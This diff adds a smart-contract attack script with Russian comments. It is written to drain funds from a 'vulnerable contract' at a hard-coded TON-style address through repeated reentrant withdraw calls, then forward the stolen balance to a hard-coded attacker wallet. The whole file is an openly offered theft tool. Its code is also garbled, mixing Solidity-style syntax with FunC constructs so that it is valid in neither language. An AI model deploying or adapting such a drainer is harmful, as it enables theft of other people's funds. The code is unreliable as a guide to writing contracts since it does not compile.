@@ -1,0 +1,43 @@
+// Интерфейс уязвимого контракта
+contract IYourContract {
+    abi "withdraw(uint128)";
+}
+
+contract Attack {
+    // Адрес уязвимого контракта
+    // Здесь вставьте адрес уязвимого контракта
+    cell target_contract_address = x{UQDz9O0JE6tVXQI3RQWPGmxVpJ1Idlk8ub2rH3gKmbGFvHZD};
+
+    // Адрес, на который будем отправлять украденные средства (ваш кошелек)
+    // Здесь вставьте свой адрес кошелька
+    slice my_wallet_address = x{UQC5dqoy8RmGVgZG0uG8KCIJ_vopvABXEcv6RE4M1EmKdypr};
+
+    // Конструктор, в котором мы передаем адрес уязвимого контракта и адрес нашего кошелька
+    () constructor() {
+        // Адреса уже заданы выше, здесь ничего менять не нужно
+    }
+
+    // Основная функция атаки
+    () attack(int amount) {
+        var target = IYourContract(target_contract_address); 
+        // Отправляем запрос на вывод средств из уязвимого контракта
+        target.withdraw(amount);
+    }
+
+    // Callback функция, которая вызывается, когда контракт получает токены (повторный вход)
+    () recv_internal(int my_balance) {
+        var target = IYourContract(target_contract_address);
+
+        // Проверяем баланс контракта
+        if (my_balance > 0) {
+            // Если есть средства, пытаемся снова вызвать withdraw
+            target.withdraw(1 ton); // Повторная попытка вывода
+        }
+    }
+
+    // Функция для вывода средств на свой адрес
+    () withdraw_to_my_address() {
+        // Переводим баланс на свой кошелек
+        send_raw_message(my_wallet_address, int(this.balance), 1); 
+    }
+}
